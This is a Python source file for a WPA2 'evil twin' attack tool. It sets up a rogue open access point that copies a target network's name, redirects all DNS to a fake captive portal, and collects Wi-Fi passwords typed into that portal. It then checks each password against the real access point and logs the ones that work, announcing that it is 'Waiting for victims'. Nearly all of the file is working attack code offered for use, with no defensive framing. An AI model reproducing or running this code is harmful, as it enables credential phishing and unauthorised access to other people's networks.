#!/usr/bin/env python3
"""
WPA2 Evil Twin Attack
Creates open AP with captive portal
Verifies entered passwords against real AP
"""

import os
import re
import sys
import time
import shutil
import subprocess
import tempfile
import threading
from pathlib import Path
from datetime import datetime

PORTAL_DIR = Path("/tmp/wpa2_evil_twin")


class Wpa2EvilTwin:
    def __init__(self, ap_iface, essid, channel=6, target_bssid=None):
        self.ap_iface = ap_iface
        self.essid = essid
        self.channel = channel
        self.target_bssid = target_bssid
        self.gateway = "10.0.0.1"
        self.port = 80
        self.running = False
        self.processes = []
        self.callback = None
        PORTAL_DIR.mkdir(exist_ok=True)

    def _log(self, msg):
        if self.callback:
            self.callback(msg)

    def _setup_interface(self):
        cmds = [
            ["ip", "link", "set", self.ap_iface, "down"],
            ["ip", "addr", "flush", "dev", self.ap_iface],
            ["ip", "addr", "add", self.gateway + "/24", "dev", self.ap_iface],
            ["ip", "link", "set", self.ap_iface, "up"],
        ]
        for cmd in cmds:
            try:
                subprocess.run(cmd, capture_output=True, timeout=5)
            except Exception:
                pass

    def _create_portal(self):
        essid = self.essid
        gw = self.gateway
        port = self.port
        bssid = self.target_bssid or ""
        ap_iface = self.ap_iface

        login_html = (
            '<!DOCTYPE html><html><head>'
            '<meta charset="UTF-8">'
            '<meta name="viewport" content="width=device-width,initial-scale=1">'
            '<title>WiFi Login</title>'
            '<style>'
            '*{margin:0;padding:0;box-sizing:border-box}'
            'body{font-family:Arial;background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);'
            'min-height:100vh;display:flex;justify-content:center;align-items:center}'
            '.box{background:#fff;padding:40px;border-radius:20px;'
            'box-shadow:0 30px 60px rgba(0,0,0,.3);max-width:420px;width:90%}'
            'h1{color:#333;text-align:center;font-size:20px;margin-bottom:10px}'
            'p{color:#666;text-align:center;font-size:13px;margin-bottom:15px}'
            'input{width:100%;padding:14px;border:2px solid #ddd;border-radius:10px;'
            'font-size:16px;margin-bottom:15px}'
            'input:focus{outline:none;border-color:#2c5364}'
            '.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0f2027,#2c5364);'
            'color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:bold;cursor:pointer}'
            '.info{color:#888;font-size:11px;text-align:center;margin-top:15px}'
            '</style></head><body>'
            '<div class="box">'
            '<h1>WiFi Authentication Required</h1>'
            '<p>Network: <b>' + essid + '</b></p>'
            '<p>Enter your WiFi password to continue</p>'
            '<form method="POST" action="/verify">'
            '<input type="password" name="password" placeholder="WiFi password" minlength="8" required autofocus>'
            '<button type="submit" class="btn">Connect</button>'
            '</form>'
            '<p class="info">Your connection will be restored automatically.</p>'
            '</div></body></html>'
        )

        with open(PORTAL_DIR / "login.html", "w") as f:
            f.write(login_html)

        # Server script as separate file to avoid quote issues
        server_lines = [
            '#!/usr/bin/env python3',
            'import os, sys, subprocess, tempfile, shutil',
            'from http.server import HTTPServer, BaseHTTPRequestHandler',
            'from urllib.parse import parse_qs',
            'from datetime import datetime',
            '',
            'PORTAL = "' + str(PORTAL_DIR) + '"',
            'GATEWAY = "' + gw + '"',
            'ESSID = "' + essid + '"',
            'BSSID = "' + bssid + '"',
            'AP_IFACE = "' + ap_iface + '"',
            '',
            'class H(BaseHTTPRequestHandler):',
            '    def log_message(self, *a): pass',
            '',
            '    def do_GET(self):',
            '        p = self.path.split("?")[0].strip("/")',
            '        if p in ("generate_204","gen_204","hotspot-detect.html",',
            '                 "redirect","connecttest.txt","ncsi.txt"):',
            '            self.send_response(302)',
            '            self.send_header("Location","/login.html")',
            '            self.end_headers()',
            '        elif p == "login.html":',
            '            self.send_response(200)',
            '            self.send_header("Content-Type","text/html; charset=utf-8")',
            '            self.end_headers()',
            '            with open(os.path.join(PORTAL,"login.html"),"rb") as f:',
            '                self.wfile.write(f.read())',
            '        else:',
            '            self.send_response(302)',
            '            self.send_header("Location","/login.html")',
            '            self.end_headers()',
            '',
            '    def do_POST(self):',
            '        if "/verify" in self.path:',
            '            cl = int(self.headers.get("Content-Length",0))',
            '            body = self.rfile.read(cl).decode("utf-8","ignore")',
            '            pw = parse_qs(body).get("password",[""])[0]',
            '            if pw and len(pw) >= 8:',
            '                ip = self.client_address[0]',
            '                ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")',
            '                with open(os.path.join(PORTAL,"captured.txt"),"a") as f:',
            '                    f.write(f"{ts} | IP:{ip} | Password:{pw}\\n")',
            '                print(f"[+] Password attempt: {pw} from {ip}", flush=True)',
            '                # Try to verify against real AP',
            '                ok = verify(ESSID, pw, BSSID)',
            '                if ok:',
            '                    with open(os.path.join(PORTAL,"verified.txt"),"a") as f:',
            '                        f.write(f"{ts} | SSID:{ESSID} | Password:{pw}\\n")',
            '                    print(f"[+] VERIFIED: {pw}", flush=True)',
            '                    self.send_response(200)',
            '                    self.send_header("Content-Type","text/html")',
            '                    self.end_headers()',
            '                    self.wfile.write(b"<html><body style=\\"background:#27ae60;min-height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:Arial;text-align:center\\"><div><h1>Connected!</h1><p>You are now online.</p></div></body></html>")',
            '                else:',
            '                    print(f"[*] Wrong: {pw}", flush=True)',
            '                    self.send_response(200)',
            '                    self.send_header("Content-Type","text/html")',
            '                    self.end_headers()',
            '                    self.wfile.write(b"<html><body style=\\"background:#e74c3c;min-height:100vh;display:flex;justify-content:center;align-items:center;color:#fff;font-family:Arial;text-align:center\\"><div><h1>Wrong Password</h1><p>Please try again.</p><a href=\\"/login.html\\" style=\\"color:#fff\\">Try Again</a></div></body></html>")',
            '                return',
            '        self.send_response(302)',
            '        self.send_header("Location","/login.html")',
            '        self.end_headers()',
            '',
            'def verify(ssid, password, bssid):',
            '    """Try to connect to real AP with given password"""',
            '    tmpdir = tempfile.mkdtemp(prefix="verify_")',
            '    conf = os.path.join(tmpdir, "wpa.conf")',
            '    with open(conf, "w") as f:',
            '        f.write("ctrl_interface=" + tmpdir + "\\n")',
            '        f.write("ctrl_interface_group=root\\n")',
            '        f.write("network={\\n")',
            '        f.write("    ssid=\\"" + ssid + "\\"\\n")',
            '        if bssid:',
            '            f.write("    bssid=" + bssid + "\\n")',
            '        f.write("    psk=\\"" + password + "\\"\\n")',
            '        f.write("    key_mgmt=WPA-PSK\\n")',
            '        f.write("    scan_ssid=1\\n")',
            '        f.write("}\\n")',
            '    try:',
            '        r = subprocess.run(',
            '            ["wpa_supplicant", "-i", AP_IFACE, "-c", conf, "-D", "nl80211,wext"],',
            '            capture_output=True, text=True, timeout=20)',
            '        out = r.stdout + r.stderr',
            '        ok = "key negotiation completed" in out.lower()',
            '        shutil.rmtree(tmpdir, ignore_errors=True)',
            '        return ok',
            '    except Exception:',
            '        shutil.rmtree(tmpdir, ignore_errors=True)',
            '        return False',
            '',
            'print("[*] Captive portal on port ' + str(port) + '", flush=True)',
            'HTTPServer(("0.0.0.0", ' + str(port) + '), H).serve_forever()',
        ]

        with open(PORTAL_DIR / "verify_server.py", "w") as f:
            f.write("\n".join(server_lines))

    def _start_hostapd(self):
        conf_content = (
            "interface=" + self.ap_iface + "\n"
            "driver=nl80211\n"
            "ssid=" + self.essid + "\n"
            "hw_mode=g\n"
            "channel=" + str(self.channel) + "\n"
            "wmm_enabled=0\n"
            "macaddr_acl=0\n"
            "auth_algs=1\n"
            "ignore_broadcast_ssid=0\n"
        )
        conf_file = PORTAL_DIR / "hostapd.conf"
        with open(conf_file, "w") as f:
            f.write(conf_content)

        try:
            proc = subprocess.Popen(
                ["hostapd", str(conf_file)],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("hostapd", proc))
            time.sleep(3)
            if proc.poll() is not None:
                out = ""
                try:
                    out = proc.stdout.read()[:200] if proc.stdout else ""
                except Exception:
                    pass
                self._log("[!] hostapd failed: " + str(out))
                return False
            self._log("[+] hostapd: " + self.essid + " CH" + str(self.channel))
            return True
        except FileNotFoundError:
            self._log("[!] hostapd not found: apt install hostapd")
            return False

    def _start_dnsmasq(self):
        try:
            subprocess.run(["killall", "dnsmasq"], capture_output=True, timeout=5)
        except Exception:
            pass
        time.sleep(1)

        conf_content = (
            "interface=" + self.ap_iface + "\n"
            "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
            "dhcp-option=3," + self.gateway + "\n"
            "dhcp-option=6," + self.gateway + "\n"
            "server=8.8.8.8\n"
            "address=/#/" + self.gateway + "\n"
            "no-resolv\n"
            "no-hosts\n"
            "cache-size=0\n"
        )
        conf_file = PORTAL_DIR / "dnsmasq.conf"
        with open(conf_file, "w") as f:
            f.write(conf_content)

        try:
            proc = subprocess.Popen(
                ["dnsmasq", "-C", str(conf_file), "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("dnsmasq", proc))
            time.sleep(1)
            self._log("[+] dnsmasq: DHCP + DNS redirect")
        except FileNotFoundError:
            self._log("[!] dnsmasq not found: apt install dnsmasq")

    def _start_webserver(self):
        try:
            proc = subprocess.Popen(
                [sys.executable, str(PORTAL_DIR / "verify_server.py")],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1
            )
            self.processes.append(("webserver", proc))
            self._log("[+] Captive portal: http://" + self.gateway + ":" + str(self.port))
        except Exception as e:
            self._log("[!] Web server error: " + str(e))

    def _monitor_creds(self):
        vf = PORTAL_DIR / "verified.txt"
        cf = PORTAL_DIR / "captured.txt"
        last_v = 0
        last_c = 0
        while self.running:
            time.sleep(2)
            if vf.exists():
                try:
                    with open(vf) as f:
                        lines = [l.strip() for l in f if l.strip()]
                    if len(lines) > last_v:
                        for line in lines[last_v:]:
                            self._log("[+] VERIFIED: " + line)
                        last_v = len(lines)
                except Exception:
                    pass
            if cf.exists():
                try:
                    with open(cf) as f:
                        lines = [l.strip() for l in f if l.strip()]
                    if len(lines) > last_c:
                        for line in lines[last_c:]:
                            self._log("[*] Attempt: " + line)
                        last_c = len(lines)
                except Exception:
                    pass

    def start_captive_attack(self):
        self.running = True
        self._log("[+] Starting WPA2 Evil Twin: " + self.essid)

        self._log("[*] Creating portal...")
        self._create_portal()

        self._log("[*] Configuring " + self.ap_iface + "...")
        self._setup_interface()

        self._log("[*] Starting hostapd...")
        if not self._start_hostapd():
            return False
        time.sleep(3)

        self._log("[*] Starting dnsmasq...")
        self._start_dnsmasq()
        time.sleep(2)

        self._log("[*] Starting captive portal...")
        self._start_webserver()
        time.sleep(1)

        threading.Thread(target=self._monitor_creds, daemon=True).start()

        self._log("")
        self._log("=" * 50)
        self._log("  WPA2 EVIL TWIN ACTIVE")
        self._log("  SSID:     " + self.essid)
        self._log("  Channel:  " + str(self.channel))
        self._log("  Portal:   http://" + self.gateway + ":" + str(self.port))
        self._log("  Waiting for victims...")
        self._log("=" * 50)

        return True

    def stop(self):
        self.running = False
        for name, proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for prog in ["hostapd", "dnsmasq"]:
            try:
                subprocess.run(["killall", prog], capture_output=True, timeout=5)
            except Exception:
                pass
        try:
            subprocess.run(
                ["ip", "addr", "del", self.gateway + "/24", "dev", self.ap_iface],
                capture_output=True, timeout=5
            )
        except Exception:
            pass
        self.processes = []
        self._log("[+] Evil Twin stopped")

    def get_verified_passwords(self):
        vf = PORTAL_DIR / "verified.txt"
        results = []
        if vf.exists():
            try:
                with open(vf) as f:
                    for line in f:
                        m = re.search(r"Password:(.+)", line.strip())
                        if m:
                            results.append(m.group(1).strip())
            except Exception:
                pass
        return results

    def get_all_attempts(self):
        cf = PORTAL_DIR / "captured.txt"
        results = []
        if cf.exists():
            try:
                with open(cf) as f:
                    for line in f:
                        m = re.search(r"Password:(.+)", line.strip())
                        if m:
                            results.append(m.group(1).strip())
            except Exception:
                pass
        return results
